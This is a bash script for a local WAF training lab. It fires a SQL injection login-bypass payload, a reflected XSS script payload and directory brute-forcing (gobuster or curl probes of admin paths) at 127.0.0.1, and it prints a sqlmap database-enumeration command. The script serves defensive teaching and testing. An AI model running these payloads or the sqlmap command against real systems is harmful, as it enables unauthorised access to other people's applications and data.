#!/bin/bash
# Demonstrates the three attack types from the original exercise against the local lab only.
set -e

echo "Choose target:"
echo "  1) Direct (no WAF)  http://127.0.0.1:8080"
echo "  2) Through WAF      http://127.0.0.1:8082"
read -rp "1 or 2 [1]: " c
c=${c:-1}
BASE="http://127.0.0.1:8080"
[[ "$c" == "2" ]] && BASE="http://127.0.0.1:8082"

echo ""
echo "=== 1. SQL Injection probe (login form) ==="
# Classic payload — when WAF is Off/DetectionOnly and security is open, login may succeed as admin
curl -s -o /tmp/sqli_out.html -w "HTTP %{http_code}\n" \
  -X POST "$BASE/login.php" \
  -d "username=admin' OR '1'='1' -- &password=x" || true
if grep -qi "dashboard\|Welcome\|authenticated" /tmp/sqli_out.html 2>/dev/null; then
  echo "[!] Possible SQLi success (check if redirected / logged in)"
else
  echo "[*] Response received (inspect manually or check WAF 403)"
fi

echo ""
echo "=== 2. XSS probe (search) ==="
curl -s -o /tmp/xss_out.html -w "HTTP %{http_code}\n" \
  -G "$BASE/search.php" \
  --data-urlencode "q=<script>alert('Hacked!');</script>" || true
if grep -q "<script>alert" /tmp/xss_out.html 2>/dev/null; then
  echo "[!] XSS payload reflected in page (open in browser to confirm)"
else
  echo "[*] Payload may be blocked or filtered — check status / WAF logs"
fi

echo ""
echo "=== 3. Directory discovery (gobuster if available) ==="
if command -v gobuster &>/dev/null; then
  gobuster dir -u "$BASE" -w /usr/share/wordlists/dirb/common.txt -t 15 -q --no-error 2>/dev/null | head -25 || true
else
  echo "Install gobuster: sudo apt install gobuster"
  echo "Example: gobuster dir -u $BASE -w /usr/share/wordlists/dirb/common.txt"
  echo "Manual probes:"
  for p in /admin /admin/ /admin/backup.php /login.php /robots.txt; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$BASE$p")
    echo "  $p → $code"
  done
fi

echo ""
echo "Full sqlmap example (after confirming target):"
echo "  sqlmap -u \"$BASE/login.php\" --data=\"username=test&password=test\" --batch --dbs"
echo ""
echo "Watch defender side: ./scripts/watch-logs.sh"
